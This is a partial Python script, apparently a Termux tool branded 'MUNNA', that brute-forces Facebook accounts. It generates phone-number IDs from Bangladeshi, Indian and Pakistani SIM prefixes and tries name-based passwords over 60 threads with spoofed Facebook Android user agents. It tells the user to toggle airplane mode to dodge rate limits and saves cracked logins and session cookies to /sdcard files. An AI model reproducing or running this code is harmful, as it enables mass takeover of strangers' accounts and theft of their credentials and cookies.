...
def line():
	print(40*"━")
############------[ RANDOM SYS ]------#########
BDX  = f"\x1b[1;92mBD SIM CODE : \x1b[1;96m017 015 018 019 013 016\x1b[0m\x1b[1;97m"
INDX = f"\x1b[1;92mIND SIM CODE : \x1b[1;92m9670 9725 8948 8795 6383\x1b[0m\x1b[1;97m"
PAKX = f"\x1b[1;92mPAK SIM CODE : \x1b[1;95m0306 0315 0335 0345 0318\x1b[0m\x1b[1;97m"
LIMITX = f"\x1b[1;92mEXAMPLE : \x1b[1;93m1000\x1b[1;97m, \x1b[1;92m5000\x1b[1;97m, \x1b[1;96m10000\x1b[1;97m, \x1b[1;95m15000\x1b[1;97m, \x1b[1;91m20000\x1b[1;97m"
############------[ A SYS ]------#########
CPG  = f"\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \x1b[1;96mDo you want to show CP account (y/n)"
CKIG = f"\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \x1b[1;95mDo you want to show Cookie (y/n)"
chc=f'{BL}[{BL}+{BL}] Choice : {BL}'
flp=f"{W}[{G}•{W}] PUT FILE PATH\033[1;37m : {BL}"
chcps=f'EXAMPLE: {G}first123{W},{G}last123{W},{G}firstlast{W},{G}name{W}'
mxxt=f'{W}[{G}A{W}] METHOD [{G}1{W}]\n{W}[{G}B{W}] METHOD [{G}2{W}]\n{W}[{G}C{W}] METHOD [{G}5{W}]'
nflp=f"[{R}!{W}] FILE LOCATION NOT FOUND "
############------[ LOGO ]------#########
os.system('espeak -a 300 "well,come to, munna , on,  fire, tools"')
...
class apvroval:
    def check():
        url = "https://github.com/MUNNA-TEAM-143/Approval/blob/main/Approval.txt"
        import mechanize
        ...
        try:
            ...
            if MY_KEY in check_key:
                ...
                appv = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+MY_KEY);os.system('am start https://t.me/MUNNA_ON_FIRE?text='+appv),approval()  
                time.sleep(59)
...
def usx():
	...
	return max
os.system('xdg-open https://t.me/https:munna_on_fire143')
...
def usx():
	wr = "Mozilla/5.0 (Linux; Android 10; MunnaProxy Build) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36"
	nt = "Mozilla/5.0 (Linux; Android 13; innova30 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/137.0.7151.115 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/513.1.0.46.107;]"
...
\x1b[1;92m╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═══╝╚═╝  ╚═╝
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[1;92m[+] AUTHOR    : KALYAN/KING    
\x1b[1;92m[+] FACEBOOK  : MUNNA/KING    
\x1b[1;92m[+] TELEGRAM  : MUNNA_ON_FIRE         
...
def Main():
	logo()
	print(f' \x1b[1;97m[\x1b[1;96mA\x1b[1;97m]\x1b[1;92m RANDOM  [\x1b[1;92mBANGLADESH\x1b[1;97m]')
	print(f' \x1b[1;97m[\x1b[1;96mB\x1b[1;97m]\x1b[1;91m RANDOM  [\x1b[1;91mPAKISTAN\x1b[1;97m]')
	print(f' \x1b[1;97m[\x1b[1;96mC\x1b[1;97m]\x1b[1;93m RANDOM  [\x1b[1;93mINDIA\x1b[1;97m]') 
	line()
	ghx=input(f' ~/>>Choice >>>>: {B}')
...
def rmenu1():
	...
	with ThreadPool(max_workers=60) as smrn:
		tid= str(len(xode))
		logo();print(f' \x1b[1;97m[\x1b[1;96m•\x1b[1;97m] TOTAL ID :\x1b[1;94m '+tid);print (f' \x1b[1;97m[\x1b[1;96m•\x1b[1;97m] SIM CODE : \x1b[1;92m'+code);print(f' \x1b[1;97m[\x1b[1;96m•\x1b[1;97m] \x1b[1;93mTHE PROCESS HAS BEEN STARTED');print(f' \x1b[1;97m[\x1b[1;96m•\x1b[1;97m] \x1b[1;95mUSE AEROPLANE MODE IN EVERY 3 MIN ');print("\x1b[1;90m" + "="*40 + "\x1b[0m")
		for rngx in xode:
			id=code+rngx
...
def M1X(id,psd,tid):
	...
	sys.stdout.write(f'\r[/{rx}±{G}/] {G} [{rx}M{cc}U{rr}N{rx}N{rx}A{G}] {G} [{rx}{lop}{G}] OK : {X}{len(ok)} {G}CP : {R} {len(cp)} ');sys.stdout.flush()
	for psw in psd:
		...
		u1a = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {str(gtt)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+"[FBAN/FB4A;FBAV/522.0.0.52.96;FBBV/236468732;FBDM/{density=2.625,width=1080,height=1794};FBLC/en_US;FBRV/238430540;FBCR/Robi/Airtel;FBMF/INFINIX;FBBD/Infinix;FBDV/Infinix X669;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1444};FB_FW/1;]"
		...
		if 'session_key' in lo:
			...
			print(f'\r\r{G}[MUNNA-OK] {iid} | {psw}{W}');os.system('espeak -a 300 "ok id"');ok.append(id);open('/sdcard/MUNNA-OK.txt', 'a').write(iid+' | '+psw+'--->>>'+coki+"\n")
			if 'y' in cokix:print(f'\r\r{R}[{G}COOKIES{R}]{W} : {rx}{coki}{E}');print(f"{W}{45*'-'}{E}")
			cek_apk(coki)
			break
		elif twfx in str(lo):
			iid = lo['error']['error_data']['uid']
			print(f'\r\r{BL}[MUNNA-2F] {iid} | {psw}{W}');os.system('espeak -a 300 "two,f id"');open('/sdcard/MUNNA-2F.txt', 'a').write(iid+' | '+psw+"\n")
			twf.append(id)
			break
			...
			if iid in ok:pass
				...
				if 'y' in cpx:
					print(f'\r\r{S}[MUNNA-CP] {iid} | {psw}{W}');cp.append(id);os.system('espeak -a 300 "cp id"');open('/sdcard/MUNNA-CP.txt', 'a').write(iid+' | '+psw+"\n")
			break
		else:continue
	lop+=1
